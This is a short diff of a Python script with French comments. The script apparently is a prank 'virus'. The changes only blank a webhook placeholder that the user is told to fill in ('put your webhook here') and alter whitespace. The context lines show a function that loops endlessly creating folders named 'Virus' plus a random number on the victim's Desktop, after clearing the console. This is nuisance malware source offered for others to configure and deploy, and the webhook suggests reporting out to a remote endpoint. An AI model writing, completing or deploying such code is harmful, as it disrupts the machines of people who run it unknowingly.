@@ -34,7 +34,7 @@ print(f""" {yellow}
 """)
 os.system("cls")
 
-webhook = "U_webhook" # Ici faut placer ton webhook
+webhook = "" # Ici faut placer ton webhook
 
 def dossier():
     while True:
@@ -42,7 +42,7 @@ def dossier():
             ajout = random.randint(1, 100000)
             bureau = os.path.join(os.path.expanduser("~"), "Desktop")
             new_dossier = os.path.join(bureau, f"Virus{ajout}")
-
+     
             os.mkdir(new_dossier)
         except Exception as e:
             print("Error", e)
